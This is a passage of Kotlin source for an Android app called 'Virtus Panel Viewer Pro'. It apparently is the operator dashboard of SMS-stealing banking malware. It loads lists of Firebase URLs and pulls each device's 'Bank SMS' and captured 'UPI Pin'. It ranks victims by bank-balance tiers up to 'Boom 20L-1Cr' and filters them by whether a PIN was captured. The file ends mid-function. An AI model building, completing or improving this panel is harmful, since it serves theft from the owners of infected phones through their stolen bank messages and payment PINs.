package com.firebasepanel.sms

import android.os.Bundle
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.activity.result.contract.ActivityResultContracts
import androidx.activity.viewModels
import androidx.compose.foundation.BorderStroke
import androidx.compose.foundation.Image
import androidx.compose.foundation.background
import androidx.compose.foundation.border
import androidx.compose.foundation.clickable
import androidx.compose.foundation.layout.Arrangement
import androidx.compose.foundation.layout.Box
import androidx.compose.foundation.layout.Column
import androidx.compose.foundation.layout.PaddingValues
import androidx.compose.foundation.layout.Row
import androidx.compose.foundation.layout.Spacer
import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.foundation.layout.fillMaxWidth
import androidx.compose.foundation.layout.height
import androidx.compose.foundation.layout.heightIn
import androidx.compose.foundation.layout.padding
import androidx.compose.foundation.layout.size
import androidx.compose.foundation.layout.width
import androidx.compose.foundation.lazy.LazyColumn
import androidx.compose.foundation.lazy.items
import androidx.compose.foundation.rememberScrollState
import androidx.compose.foundation.shape.CircleShape
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.foundation.verticalScroll
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.filled.Close
import androidx.compose.material.icons.filled.Delete
import androidx.compose.material.icons.filled.AccountBalance
import androidx.compose.material.icons.filled.FlashOn
import androidx.compose.material.icons.filled.FolderOpen
import androidx.compose.material.icons.filled.Info
import androidx.compose.material.icons.filled.Phone
import androidx.compose.material.icons.filled.PlayArrow
import androidx.compose.material.icons.filled.Search
import androidx.compose.material.icons.filled.Smartphone
import androidx.compose.material.icons.filled.ThumbUp
import androidx.compose.material.icons.filled.UploadFile
import androidx.compose.material3.Button
import androidx.compose.material3.ButtonDefaults
import androidx.compose.material3.Card
import androidx.compose.material3.CardDefaults
import androidx.compose.material3.CircularProgressIndicator
import androidx.compose.material3.ExperimentalMaterial3Api
import androidx.compose.material3.HorizontalDivider
import androidx.compose.material3.Icon
import androidx.compose.material3.IconButton
import androidx.compose.material3.MaterialTheme
import androidx.compose.material3.ModalBottomSheet
import androidx.compose.material3.OutlinedButton
import androidx.compose.material3.OutlinedTextField
import androidx.compose.material3.OutlinedTextFieldDefaults
import androidx.compose.material3.Text
import androidx.compose.material3.rememberModalBottomSheetState
import androidx.compose.runtime.Composable
import androidx.compose.runtime.collectAsState
import androidx.compose.runtime.getValue
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.draw.clip
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.layout.ContentScale
import androidx.compose.ui.res.painterResource
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.text.style.TextOverflow
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import com.firebasepanel.sms.domain.BalanceTier
import com.firebasepanel.sms.domain.ConnectionFilter
import com.firebasepanel.sms.domain.FilterConfig
import com.firebasepanel.sms.domain.PinFilter
import com.firebasepanel.sms.domain.SortMode
import com.firebasepanel.sms.ui.DeviceDetail
import com.firebasepanel.sms.ui.DeviceRow
import com.firebasepanel.sms.ui.FirebasePanelTheme
import com.firebasepanel.sms.ui.PanelViewModel
import com.firebasepanel.sms.ui.SmsRow
import com.firebasepanel.sms.R
import com.firebasepanel.sms.ui.VirtusColors
import java.text.NumberFormat
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

class MainActivity : ComponentActivity() {
    private val vm: PanelViewModel by viewModels()

    private val pickTxt =
        registerForActivityResult(ActivityResultContracts.OpenDocument()) { uri ->
            if (uri != null) {
                vm.loadUrlsFromTxt(this, uri)
            }
        }

    @OptIn(ExperimentalMaterial3Api::class)
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContent {
            FirebasePanelTheme {
                val state by vm.state.collectAsState()
                val sheetState = rememberModalBottomSheetState(skipPartiallyExpanded = true)

                Box(
                    modifier =
                        Modifier
                            .fillMaxSize()
                            .background(VirtusColors.bg),
                ) {
                    LazyColumn(
                        modifier =
                            Modifier
                                .fillMaxSize()
                                .padding(horizontal = 14.dp, vertical = 10.dp),
                    ) {
                        item {
                            VirtusHeader()
                            Spacer(Modifier.height(10.dp))
                            TopActionRow(
                                onTxt = { pickTxt.launch(arrayOf("text/*", "application/octet-stream")) },
                                onFetchLive = { vm.refreshNow() },
                                onExport = { vm.exportDeviceListTxt() },
                                panels = state.urlsLoaded,
                                fetchEnabled = !state.fetching && state.urlsLoaded > 0,
                                exportEnabled = state.devices.isNotEmpty(),
                            )
                            Spacer(Modifier.height(12.dp))
                            DashboardMetrics(state = state)
                            Spacer(Modifier.height(12.dp))
                            SearchBarWithConnection(
                                query = state.searchQuery,
                                onQueryChange = { vm.setSearchQuery(it) },
                                connection = state.config.connection,
                                onConnectionToggle = {
                                    vm.updateConfig { c ->
                                        val next =
                                            if (c.connection == ConnectionFilter.ONLINE) {
                                                ConnectionFilter.OFFLINE
                                            } else {
                                                ConnectionFilter.ONLINE
                                            }
                                        c.copy(connection = next)
                                    }
                                },
                            )
                            Spacer(Modifier.height(10.dp))
                            FilterDashboard(vm = vm, cfg = state.config)
                            Spacer(Modifier.height(10.dp))
                            ActiveStrip(cfg = state.config)
                            Spacer(Modifier.height(10.dp))
                            StartFetchButton(
                                busy = state.fetching,
                                enabled = !state.fetching && state.urlsLoaded > 0,
                                onClick = { vm.refreshNow() },
                            )
                        }
                        if (state.fetching) {
                            item {
                                Row(
                                    Modifier
                                        .fillMaxWidth()
                                        .padding(top = 8.dp),
                                    verticalAlignment = Alignment.CenterVertically,
                                ) {
                                    CircularProgressIndicator(
                                        modifier = Modifier.size(22.dp),
                                        color = VirtusColors.orange,
                                        strokeWidth = 2.dp,
                                    )
                                    Spacer(Modifier.width(10.dp))
                                    Text(
                                        state.progress.ifEmpty { "Fetching…" },
                                        color = VirtusColors.yellow,
                                        fontSize = 13.sp,
                                    )
                                }
                            }
                        }
                        state.error?.let { err ->
                            item {
                                Text(
                                    err,
                                    color = MaterialTheme.colorScheme.error,
                                    fontSize = 12.sp,
                                    modifier = Modifier.padding(top = 6.dp),
                                )
                            }
                        }
                        state.filterEmptyHint?.let { hint ->
                            item {
                                Text(
                                    hint,
                                    color = VirtusColors.orange,
                                    fontSize = 12.sp,
                                    modifier = Modifier.padding(top = 8.dp),
                                )
                            }
                        }
                        if (!state.fetching && state.lastFetchEpochMs > 0L) {
                            item {
                                Text(
                                    buildString {
                                        append("Last sync: ${formatTsLong(state.lastFetchEpochMs)}")
                                        if (state.lastFetchTotalSms > 0) {
                                            append(" · ${state.lastFetchTotalSms} SMS pulled")
                                        }
                                    },
                                    color = VirtusColors.onMuted,
                                    fontSize = 11.sp,
                                    modifier = Modifier.padding(top = 4.dp),
                                )
                            }
                        }
                        item {
                            Row(
                                modifier =
                                    Modifier
                                        .fillMaxWidth()
                                        .padding(top = 10.dp),
                                horizontalArrangement = Arrangement.Center,
                                verticalAlignment = Alignment.CenterVertically,
                            ) {
                                Icon(Icons.Filled.FolderOpen, contentDescription = null, tint = VirtusColors.yellow, modifier = Modifier.size(18.dp))
                                Spacer(Modifier.width(6.dp))
                                Text("TXT upload", color = VirtusColors.onMuted, fontSize = 11.sp)
                                Spacer(Modifier.width(8.dp))
                                Text("→", color = VirtusColors.onMuted, fontSize = 11.sp)
                                Spacer(Modifier.width(8.dp))
                                Icon(Icons.Filled.FlashOn, contentDescription = null, tint = VirtusColors.orange, modifier = Modifier.size(18.dp))
                                Spacer(Modifier.width(6.dp))
                                Text("Fetch Live", color = VirtusColors.onMuted, fontSize = 11.sp)
                                Spacer(Modifier.width(10.dp))
                                Icon(Icons.Filled.AccountBalance, contentDescription = null, tint = VirtusColors.labelBlue, modifier = Modifier.size(20.dp))
                            }
                        }
                        item {
                            Column(Modifier.fillMaxWidth().padding(top = 6.dp)) {
                                HorizontalDivider(
                                    color = VirtusColors.onMuted.copy(alpha = 0.25f),
                                    modifier = Modifier.padding(vertical = 8.dp),
                                )
                                Text(
                                    "Devices (${state.devices.size})",
                                    color = MaterialTheme.colorScheme.onBackground,
                                    fontWeight = FontWeight.SemiBold,
                                    fontSize = 14.sp,
                                )
                                Spacer(Modifier.height(8.dp))
                            }
                        }
                        items(state.devices.withIndex().toList()) { (index, row) ->
                            VirtusWhiteDeviceListCard(
                                index = index + 1,
                                row = row,
                                onOpenDetail = { vm.selectDevice(row) },
                                onInfoClick = { vm.selectDevice(row) },
                            )
                        }
                    }
                }

                state.selected?.let { d ->
                    ModalBottomSheet(
                        onDismissRequest = { vm.clearSelection() },
                        sheetState = sheetState,
                        containerColor = VirtusColors.panelYellow,
                    ) {
                        DeviceDetailSheet(d, onDismiss = { vm.clearSelection() }) {
                            Column(
                                modifier =
                                    Modifier
                                        .fillMaxWidth()
                                        .heightIn(max = 420.dp)
                                        .verticalScroll(rememberScrollState()),
                            ) {
                                d.messages.forEach { m -> VirtusYellowMsgCard(m) }
                            }
                        }
                    }
                }
            }
        }
    }
}

@Composable
private fun VirtusHeader() {
    Row(verticalAlignment = Alignment.CenterVertically) {
        Image(
            painter = painterResource(id = R.drawable.virtus_gt_sms_logo),
            contentDescription = null,
            modifier =
                Modifier
                    .size(48.dp)
                    .clip(RoundedCornerShape(10.dp)),
            contentScale = ContentScale.Crop,
        )
        Spacer(Modifier.width(12.dp))
        Column {
            Text(
                "Virtus Panel Viewer Pro",
                color = MaterialTheme.colorScheme.onBackground,
                fontWeight = FontWeight.Bold,
                fontSize = 18.sp,
            )
            Text(
                "TXT → filters → Start Fetch",
                color = VirtusColors.onMuted,
                fontSize = 12.sp,
            )
        }
    }
}

@Composable
private fun TopActionRow(
    onTxt: () -> Unit,
    onFetchLive: () -> Unit,
    onExport: () -> Unit,
    panels: Int,
    fetchEnabled: Boolean,
    exportEnabled: Boolean,
) {
    Column(
        modifier = Modifier.fillMaxWidth(),
        verticalArrangement = Arrangement.spacedBy(8.dp),
    ) {
        Row(
            modifier = Modifier.fillMaxWidth(),
            horizontalArrangement = Arrangement.SpaceBetween,
            verticalAlignment = Alignment.CenterVertically,
        ) {
            VirtusSmallButton(
                onClick = onTxt,
                container = VirtusColors.card,
                content = VirtusColors.yellow,
                icon = { Icon(Icons.Filled.FolderOpen, null) },
                label = "TXT",
            )
            Column(horizontalAlignment = Alignment.End) {
                OutlinedButton(
                    onClick = onExport,
                    enabled = exportEnabled,
                    modifier = Modifier.heightIn(min = 44.dp),
                    shape = RoundedCornerShape(14.dp),
                    border = BorderStroke(1.dp, VirtusColors.yellow),
                    colors =
                        ButtonDefaults.outlinedButtonColors(
                            containerColor = VirtusColors.card,
                            contentColor = VirtusColors.yellow,
                            disabledContentColor = VirtusColors.onMuted,
                        ),
                    contentPadding = PaddingValues(horizontal = 10.dp, vertical = 8.dp),
                ) {
                    Icon(Icons.Filled.UploadFile, contentDescription = null, modifier = Modifier.size(16.dp))
                    Spacer(Modifier.width(4.dp))
                    Text("Export TXT", fontSize = 11.sp, fontWeight = FontWeight.SemiBold, maxLines = 1)
                }
                Text(
                    "$panels panels",
                    color = VirtusColors.onMuted,
                    fontSize = 11.sp,
                    modifier = Modifier.padding(top = 4.dp),
                )
            }
        }
        Button(
            onClick = onFetchLive,
            enabled = fetchEnabled,
            modifier =
                Modifier
                    .fillMaxWidth()
                    .heightIn(min = 48.dp),
            shape = RoundedCornerShape(14.dp),
            colors =
                ButtonDefaults.buttonColors(
                    containerColor = VirtusColors.orange,
                    contentColor = Color.White,
                    disabledContainerColor = VirtusColors.card,
                    disabledContentColor = VirtusColors.onMuted,
                ),
        ) {
            Icon(Icons.Filled.FlashOn, contentDescription = null, modifier = Modifier.size(18.dp))
            Spacer(Modifier.width(8.dp))
            Text("Fetch Live", fontWeight = FontWeight.Bold, maxLines = 1)
        }
    }
}

@Composable
private fun VirtusSmallButton(
    onClick: () -> Unit,
    container: Color,
    content: Color,
    label: String,
    icon: @Composable () -> Unit,
    enabled: Boolean = true,
) {
    Button(
        onClick = onClick,
        enabled = enabled,
        modifier = Modifier.height(44.dp),
        shape = RoundedCornerShape(14.dp),
        colors =
            ButtonDefaults.buttonColors(
                containerColor = container,
                contentColor = content,
                disabledContainerColor = VirtusColors.card,
                disabledContentColor = VirtusColors.onMuted,
            ),
        contentPadding = PaddingValues(horizontal = 12.dp, vertical = 8.dp),
    ) {
        icon()
        Spacer(Modifier.width(4.dp))
        Text(label, fontSize = 12.sp, fontWeight = FontWeight.SemiBold)
    }
}

@Composable
private fun DashboardMetrics(state: com.firebasepanel.sms.ui.UiState) {
    val devices = state.devices
    val totalDev = devices.size
    val onlineDev = devices.count { it.online }
    val maxBal = devices.maxOfOrNull { it.maxBalance } ?: 0.0
    val totalSms = devices.sumOf { it.smsCount }
    val nf = NumberFormat.getNumberInstance(Locale.US)
    Row(
        modifier = Modifier.fillMaxWidth(),
        horizontalArrangement = Arrangement.spacedBy(8.dp),
    ) {
        MetricCard("DEVICES", totalDev.toString(), VirtusColors.orange, Modifier.weight(1f))
        MetricCard("ONLINE", onlineDev.toString(), VirtusColors.green, Modifier.weight(1f))
        MetricCard(
            "BALANCE",
            if (maxBal > 0) "₹${nf.format(maxBal.toLong())}" else "—",
            VirtusColors.yellow,
            Modifier.weight(1f),
        )
    }
    Spacer(Modifier.height(8.dp))
    Row(
        modifier = Modifier.fillMaxWidth(),
        horizontalArrangement = Arrangement.spacedBy(8.dp),
    ) {
        MetricCard("BANK SMS", totalSms.toString(), VirtusColors.blue, Modifier.weight(1f))
        MetricCard("PHONE", state.urlsLoaded.toString(), VirtusColors.green, Modifier.weight(1f))
        Spacer(Modifier.weight(1f))
    }
}

@Composable
private fun MetricCard(
    title: String,
    value: String,
    valueColor: Color,
    modifier: Modifier = Modifier,
) {
    Card(
        modifier = modifier,
        shape = RoundedCornerShape(14.dp),
        colors = CardDefaults.cardColors(containerColor = VirtusColors.card),
        elevation = CardDefaults.cardElevation(defaultElevation = 2.dp),
    ) {
        Column(Modifier.padding(horizontal = 10.dp, vertical = 10.dp)) {
            Text(title, color = VirtusColors.onMuted, fontSize = 10.sp, letterSpacing = 0.5.sp)
            Spacer(Modifier.height(4.dp))
            Text(
                value,
                color = valueColor,
                fontWeight = FontWeight.Bold,
                fontSize = 16.sp,
                maxLines = 1,
                overflow = TextOverflow.Ellipsis,
            )
        }
    }
}

@Composable
private fun SearchBarWithConnection(
    query: String,
    onQueryChange: (String) -> Unit,
    connection: ConnectionFilter,
    onConnectionToggle: () -> Unit,
) {
    Row(
        modifier = Modifier.fillMaxWidth(),
        verticalAlignment = Alignment.CenterVertically,
        horizontalArrangement = Arrangement.spacedBy(8.dp),
    ) {
        OutlinedTextField(
            value = query,
            onValueChange = onQueryChange,
            modifier = Modifier.weight(1f),
            placeholder = { Text("Search Here", color = VirtusColors.onMuted) },
            leadingIcon = {
                Icon(Icons.Filled.Search, contentDescription = null, tint = VirtusColors.onMuted)
            },
            singleLine = true,
            shape = RoundedCornerShape(16.dp),
            colors =
                OutlinedTextFieldDefaults.colors(
                    focusedContainerColor = VirtusColors.card,
                    unfocusedContainerColor = VirtusColors.card,
                    focusedBorderColor = VirtusColors.orange.copy(alpha = 0.8f),
                    unfocusedBorderColor = VirtusColors.onMuted.copy(alpha = 0.35f),
                    focusedTextColor = MaterialTheme.colorScheme.onBackground,
                    unfocusedTextColor = MaterialTheme.colorScheme.onBackground,
                    cursorColor = VirtusColors.yellow,
                ),
        )
        val connLabel =
            when (connection) {
                ConnectionFilter.ONLINE -> "Online"
                ConnectionFilter.OFFLINE -> "Offline"
                ConnectionFilter.BOTH -> "Online"
            }
        val connEmoji =
            when (connection) {
                ConnectionFilter.ONLINE -> "🟢"
                ConnectionFilter.OFFLINE -> "⚫"
                ConnectionFilter.BOTH -> "🟢"
            }
        Row(
            modifier =
                Modifier
                    .clip(RoundedCornerShape(16.dp))
                    .background(VirtusColors.card)
                    .border(1.dp, VirtusColors.onMuted.copy(alpha = 0.3f), RoundedCornerShape(16.dp))
                    .clickable(onClick = onConnectionToggle)
                    .padding(horizontal = 12.dp, vertical = 14.dp),
            verticalAlignment = Alignment.CenterVertically,
        ) {
            Text(connEmoji, fontSize = 12.sp)
            Spacer(Modifier.width(4.dp))
            Text(
                connLabel,
                color = VirtusColors.green,
                fontWeight = FontWeight.SemiBold,
                fontSize = 12.sp,
            )
        }
    }
}

@Composable
private fun FilterDashboard(
    vm: PanelViewModel,
    cfg: FilterConfig,
) {
    val sectionLabel = VirtusColors.onMuted
    Column(verticalArrangement = Arrangement.spacedBy(8.dp)) {
        Row(
            modifier = Modifier.fillMaxWidth(),
            horizontalArrangement = Arrangement.spacedBy(6.dp),
        ) {
            VirtusFilterPill(
                selected =
                    cfg.balanceTier == BalanceTier.HIGH_1L_20L &&
                        cfg.sortMode == SortMode.HIGH_TO_LOW,
                label = "High 1L-20L",
                emoji = "⬇",
                lightTheme = false,
                onClick = {
                    vm.updateConfig {
                        it.copy(
                            balanceTier = BalanceTier.HIGH_1L_20L,
                            sortMode = SortMode.HIGH_TO_LOW,
                        )
                    }
                },
            )
            VirtusFilterPill(
                selected =
                    cfg.balanceTier == BalanceTier.BOOM_20L_90L &&
                        cfg.sortMode == SortMode.HIGH_TO_LOW,
                label = "Boom 20L-1Cr",
                emoji = "💥",
                lightTheme = false,
                onClick = {
                    vm.updateConfig {
                        it.copy(
                            balanceTier = BalanceTier.BOOM_20L_90L,
                            sortMode = SortMode.HIGH_TO_LOW,
                        )
                    }
                },
            )
            VirtusFilterPill(
                selected =
                    cfg.balanceTier == BalanceTier.MEDIUM_5K_1L &&
                        cfg.sortMode == SortMode.HIGH_TO_LOW,
                label = "Medium 5K",
                emoji = "💛",
                lightTheme = false,
                onClick = {
                    vm.updateConfig {
                        it.copy(
                            balanceTier = BalanceTier.MEDIUM_5K_1L,
                            sortMode = SortMode.HIGH_TO_LOW,
                        )
                    }
                },
            )
            VirtusFilterPill(
                selected =
                    cfg.balanceTier == BalanceTier.LOW_2K_50K &&
                        cfg.sortMode == SortMode.LOW_TO_HIGH,
                label = "Low → High",
                emoji = "⬆",
                lightTheme = false,
                onClick = {
                    vm.updateConfig {
                        it.copy(
                            balanceTier = BalanceTier.LOW_2K_50K,
                            sortMode = SortMode.LOW_TO_HIGH,
                        )
                    }
                },
            )
        }
        Text("PIN (device)", color = sectionLabel, fontSize = 11.sp, fontWeight = FontWeight.Medium)
        Row(
            modifier = Modifier.fillMaxWidth(),
            horizontalArrangement = Arrangement.spacedBy(6.dp),
        ) {
            VirtusFilterPill(
                selected = cfg.pinFilter == PinFilter.WITH,
                label = "PIN",
                emoji = "🔑",
                lightTheme = false,
                onClick = {
                    vm.updateConfig { c ->
                        val next =
                            if (c.pinFilter == PinFilter.WITH) PinFilter.BOTH else PinFilter.WITH
                        c.copy(pinFilter = next)
                    }
                },
            )
            VirtusFilterPill(
                selected = cfg.pinFilter == PinFilter.WITHOUT,
                label = "No PIN",
                emoji = "🚫",
                lightTheme = false,
                onClick = {
                    vm.updateConfig { c ->
                        val next =
                            if (c.pinFilter == PinFilter.WITHOUT) PinFilter.BOTH else PinFilter.WITHOUT
                        c.copy(pinFilter = next)
                    }
                },
            )
        }
        Text("SMS age (optional)", color = sectionLabel, fontSize = 11.sp, fontWeight = FontWeight.Medium)
        Row(
            modifier = Modifier.fillMaxWidth(),
            horizontalArrangement = Arrangement.spacedBy(6.dp),
        ) {
            VirtusFilterPill(
                selected = cfg.days == 1,
                label = "1d",
                emoji = "🕐",
                compact = true,
                lightTheme = false,
                onClick = { vm.updateConfig { it.copy(days = 1) } },
            )
            VirtusFilterPill(
                selected = cfg.days == null,
                label = "All",
                emoji = "∞",
                compact = true,
                lightTheme = false,
                onClick = { vm.updateConfig { it.copy(days = null) } },
            )
        }
    }
}

@Composable
private fun VirtusFilterPill(
    selected: Boolean,
    label: String,
    emoji: String,
    onClick: () -> Unit,
    compact: Boolean = false,
    lightTheme: Boolean = false,
) {
    val bg =
        when {
            selected && lightTheme -> VirtusColors.orange.copy(alpha = 0.45f)
            selected && !lightTheme -> VirtusColors.orange.copy(alpha = 0.22f)
            lightTheme -> Color.White.copy(alpha = 0.92f)
            else -> VirtusColors.card
        }
    val border =
        when {
            selected && lightTheme -> VirtusColors.labelBlue
            selected && !lightTheme -> VirtusColors.yellow
            lightTheme -> Color(0xFFCCCCCC)
            else -> VirtusColors.onMuted.copy(alpha = 0.25f)
        }
    val textColor =
        when {
            selected && lightTheme -> Color(0xFF0D47A1)
            selected && !lightTheme -> VirtusColors.yellow
            lightTheme -> Color(0xFF212121)
            else -> MaterialTheme.colorScheme.onBackground.copy(alpha = 0.92f)
        }
    val padH = if (compact) 8.dp else 10.dp
    Row(
        modifier =
            Modifier
                .clip(RoundedCornerShape(20.dp))
                .background(bg)
                .border(1.dp, border, RoundedCornerShape(20.dp))
                .clickable(onClick = onClick)
                .padding(horizontal = padH, vertical = 8.dp),
        verticalAlignment = Alignment.CenterVertically,
    ) {
        Text(emoji, fontSize = if (compact) 11.sp else 13.sp)
        Spacer(Modifier.width(4.dp))
        Text(
            label,
            color = textColor,
            fontSize = if (compact) 11.sp else 12.sp,
            fontWeight = if (selected) FontWeight.Bold else FontWeight.Normal,
            maxLines = 1,
            overflow = TextOverflow.Ellipsis,
        )
    }
}

@Composable
private fun ActiveStrip(cfg: FilterConfig) {
    val parts = mutableListOf<String>()
    parts.add(
        when (cfg.balanceTier) {
            BalanceTier.HIGH_1L_20L -> "High 1L-20L"
            BalanceTier.BOOM_20L_90L -> "Boom 20L-1Cr"
            BalanceTier.MEDIUM_5K_1L -> "Medium 5K"
            BalanceTier.LOW_2K_50K -> "Low→High"
        },
    )
    parts.add(
        when (cfg.pinFilter) {
            PinFilter.WITH -> "PIN"
            PinFilter.WITHOUT -> "No PIN"
            PinFilter.BOTH -> "PIN: all"
        },
    )
    parts.add(
        when (cfg.connection) {
            ConnectionFilter.ONLINE -> "🟢 Online"
            ConnectionFilter.OFFLINE -> "⚫ Offline"
            ConnectionFilter.BOTH -> "🟢 Online+data"
        },
    )
    parts.add(
        when (cfg.days) {
            null -> "All time"
            else -> "${cfg.days}d"
        },
    )
    Row(
        modifier =
            Modifier
                .fillMaxWidth()
                .clip(RoundedCornerShape(14.dp))
                .background(VirtusColors.card)
                .border(1.dp, VirtusColors.onMuted.copy(alpha = 0.25f), RoundedCornerShape(14.dp))
                .padding(horizontal = 12.dp, vertical = 10.dp),
        verticalAlignment = Alignment.CenterVertically,
    ) {
        Text("ACTIVE", color = VirtusColors.green, fontWeight = FontWeight.Bold, fontSize = 11.sp)
        Spacer(Modifier.width(10.dp))
        Row(
            horizontalArrangement = Arrangement.spacedBy(6.dp),
            modifier = Modifier.weight(1f),
        ) {
            parts.forEach { p ->
                Box(
                    modifier =
                        Modifier
                            .clip(RoundedCornerShape(12.dp))
                            .background(VirtusColors.orange.copy(alpha = 0.28f))
                            .padding(horizontal = 8.dp, vertical = 4.dp),
                ) {
                    Text(p, color = VirtusColors.yellow, fontSize = 10.sp, maxLines = 1, overflow = TextOverflow.Ellipsis)
                }
            }
        }
    }
}

@Composable
private fun StartFetchButton(
    busy: Boolean,
    enabled: Boolean,
    onClick: () -> Unit,
) {
    Button(
        onClick = onClick,
        enabled = enabled && !busy,
        modifier =
            Modifier
                .fillMaxWidth()
                .height(52.dp),
        shape = RoundedCornerShape(16.dp),
        colors =
            ButtonDefaults.buttonColors(
                containerColor = VirtusColors.green,
                contentColor = Color(0xFF052E16),
                disabledContainerColor = VirtusColors.card,
                disabledContentColor = VirtusColors.onMuted,
            ),
    ) {
        if (busy) {
            CircularProgressIndicator(
                modifier = Modifier.size(22.dp),
                color = Color(0xFF052E16),
                strokeWidth = 2.dp,
            )
            Spacer(Modifier.width(10.dp))
            Text("Fetching…", fontWeight = FontWeight.Bold)
        } else {
            Icon(Icons.Filled.PlayArrow, contentDescription = null)
            Spacer(Modifier.width(8.dp))
            Text("Start Fetch", fontWeight = FontWeight.Bold, fontSize = 16.sp)
        }
    }
}

/** Virtus native list style: white card, blue index + outline phone; tap opens SMS sheet. */
@Composable
private fun VirtusWhiteDeviceListCard(
    index: Int,
    row: DeviceRow,
    onOpenDetail: () -> Unit,
    onInfoClick: () -> Unit,
) {
    val bankSmsLine =
        if (row.totalRawSms > 0) "${row.smsCount} / ${row.totalRawSms}" else row.smsCount.toString()
    val deviceBorder =
        if (row.online) VirtusColors.green.copy(alpha = 0.75f) else VirtusColors.deviceCardBorder
    Card(
        modifier =
            Modifier
                .fillMaxWidth()
                .padding(vertical = 6.dp)
                .clickable(onClick = onOpenDetail)
                .border(1.dp, deviceBorder, RoundedCornerShape(12.dp)),
        shape = RoundedCornerShape(12.dp),
        colors = CardDefaults.cardColors(containerColor = VirtusColors.deviceCardWhite),
        elevation = CardDefaults.cardElevation(defaultElevation = 4.dp),
    ) {
        Row(
            Modifier.padding(12.dp),
            verticalAlignment = Alignment.Top,
        ) {
            Column(horizontalAlignment = Alignment.CenterHorizontally, modifier = Modifier.width(44.dp)) {
                Text(
                    index.toString(),
                    color = VirtusColors.labelBlue,
                    fontWeight = FontWeight.Bold,
                    fontSize = 16.sp,
                )
                Spacer(Modifier.height(8.dp))
                Icon(
                    Icons.Filled.Smartphone,
                    contentDescription = null,
                    tint = VirtusColors.labelBlue,
                    modifier = Modifier.size(40.dp),
                )
            }
            Spacer(Modifier.width(10.dp))
            Column(Modifier.weight(1f)) {
                Text(
                    "Mobile: ${row.modelDisplay}",
                    color = Color(0xFF212121),
                    fontSize = 13.sp,
                    fontWeight = FontWeight.Bold,
                    maxLines = 2,
                    overflow = TextOverflow.Ellipsis,
                )
                Spacer(Modifier.height(4.dp))
                VirtusDetailRowLight("UPI Pin", row.upiPinDisplay)
                VirtusDetailRowLight("Device Id", row.deviceId)
                VirtusDetailRowLight("Firebase", row.firebaseUrl)
                VirtusDetailRowLight("Battery", if (row.batteryPercent != null) "${row.batteryPercent}%" else "N/A")
                VirtusDetailRowLight("Bank SMS", bankSmsLine)
                VirtusDetailRowLight(
                    "Date",
                    if (row.lastSeenMillis != null && row.lastSeenMillis!! > 0L) formatTsLong(row.lastSeenMillis!!) else "—",
                )
                HorizontalDivider(
                    color = VirtusColors.deviceCardBorder,
                    modifier = Modifier.padding(vertical = 6.dp),
                )
                Text(
                    "Status:${if (row.online) "Online" else "Offline"}",
                    color = if (row.online) VirtusColors.green else VirtusColors.red,
                    fontWeight = FontWeight.Bold,
                    fontSize = 13.sp,
                )
                if (row.fromClientsOnly) {
                    Spacer(Modifier.height(4.dp))
                    Text(
                        "Bank filter ne SMS hide kiye — Full inbox / tier badlo",
                        color = VirtusColors.orange.copy(alpha = 0.95f),
                        fontSize = 10.sp,
                    )
                } else if (row.previewMessages.isNotEmpty()) {
                    Spacer(Modifier.height(8.dp))
                    Text(
                        "MSG (filters ke hisaab se)",
                        color = VirtusColors.labelBlue,
                        fontWeight = FontWeight.Bold,
                        fontSize = 11.sp,
                    )
                    Spacer(Modifier.height(4.dp))
                    row.previewMessages.forEach { m ->
                        Column(
                            modifier =
                                Modifier
                                    .fillMaxWidth()
                                    .padding(vertical = 4.dp)
                                    .clip(RoundedCornerShape(8.dp))
                                    .background(VirtusColors.smsCardWhite)
                                    .padding(horizontal = 8.dp, vertical = 6.dp),
                        ) {
                            Text(
                                "MSG: ${m.body}",
                                color = VirtusColors.msgGreen,
                                fontSize = 11.sp,
                                fontWeight = FontWeight.Medium,
                                maxLines = 4,
                                overflow = TextOverflow.Ellipsis,
                            )
                            Spacer(Modifier.height(2.dp))
                            Text(
                                buildString {
                                    append("Sender: ${m.sender}")
                                    if (m.messageAtMillis != null && m.messageAtMillis!! > 0L) {
                                        append(" · ${formatTsLong(m.messageAtMillis!!)}")
                                    }
                                },
                                color = Color(0xFF616161),
                                fontSize = 9.sp,
                                maxLines = 2,
                                overflow = TextOverflow.Ellipsis,
                            )
                        }
                    }
                }
            }
            Column(
                horizontalAlignment = Alignment.CenterHorizontally,
                verticalArrangement = Arrangement.spacedBy(8.dp),
                modifier = Modifier.padding(start = 4.dp),
            ) {
                CircularActionButton(
                    bg = Color(0xFF4CAF50),
                    onClick = { /* like — UI only */ },
                ) {
                    Icon(Icons.Filled.ThumbUp, contentDescription = null, tint = Color.White, modifier = Modifier.size(18.dp))
                }
                CircularActionButton(
                    bg = VirtusColors.labelBlue,
                    onClick = onInfoClick,
                ) {
                    Text("i", color = Color.White, fontWeight = FontWeight.Bold, fontSize = 16.sp)
                }
                CircularActionButton(
                    bg = VirtusColors.red,
                    onClick = { /* delete — UI only */ },
                ) {
                    Icon(Icons.Filled.Delete, contentDescription = null, tint = Color.White, modifier = Modifier.size(18.dp))
                }
            }
        }
    }
}

@Composable
private fun CircularActionButton(
    bg: Color,
    onClick: () -> Unit,
    content: @Composable () -> Unit,
) {
    Box(
        modifier =
            Modifier
                .size(36.dp)
                .clip(CircleShape)
                .background(bg)
                .clickable(onClick = onClick),
        contentAlignment = Alignment.Center,
    ) {
        content()
    }
}

@Composable
private fun VirtusDetailRowLight(
    label: String,
    value: String,
) {
    Row(Modifier.padding(vertical = 1.dp)) {
        Text(
            "$label:",
            color = VirtusColors.labelBlue,
            fontSize = 12.sp,
            fontWeight = FontWeight.Bold,
        )
        Spacer(Modifier.width(4.dp))
        Text(
            value,
            color = Color(0xFF212121),
            fontSize = 12.sp,
            modifier = Modifier.weight(1f),
            maxLines = 2,
            overflow = TextOverflow.Ellipsis,
        )
    }
}

@Composable
private fun DeviceDetailSheet(
    d: DeviceDetail,
    onDismiss: () -> Unit,
    messagesContent: @Composable () -> Unit,
) {
    Column(
        Modifier
            .padding(16.dp)
            .fillMaxWidth()
            .background(VirtusColors.panelYellow),
    ) {
